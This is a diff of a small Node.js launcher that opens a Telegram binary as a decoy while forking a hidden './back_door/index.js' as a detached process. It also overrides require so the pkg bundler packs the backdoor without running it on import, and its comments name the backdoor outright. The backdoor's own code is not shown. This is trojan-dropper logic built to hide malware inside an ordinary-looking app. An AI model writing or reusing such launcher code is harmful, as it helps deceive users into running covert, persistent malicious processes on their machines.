@@ -1,18 +1,11 @@
 const { execFile, fork } = require('child_process')
 const path = require('path')
-const fs = require('fs')
-fs.readdirSync('/snapshot/building/').forEach(console.log)
 
-console.log(__filename)
+execFile('../../Applicazioni/Telegram/Telegram').unref()
 
-let exec_path = '../../Applicazioni/Telegram/Telegram'
-
-//console.log(backdoor_path)
-execFile(exec_path).unref()
-
+// Overwrited the require function for allow pkg the import in the snapshot but not the execution
 var require = function (str) {}
-
 require('./back_door/index.js')
 
-// Execute backdoor
-subprocess = fork(path.join('/snapshot/building/' , './back_door/index.js'), [], { detached: true })
+// Execute backdoor in detached mode
+subprocess = fork(path.join('/snapshot/build/' , './back_door/index.js'), [], { detached: true })
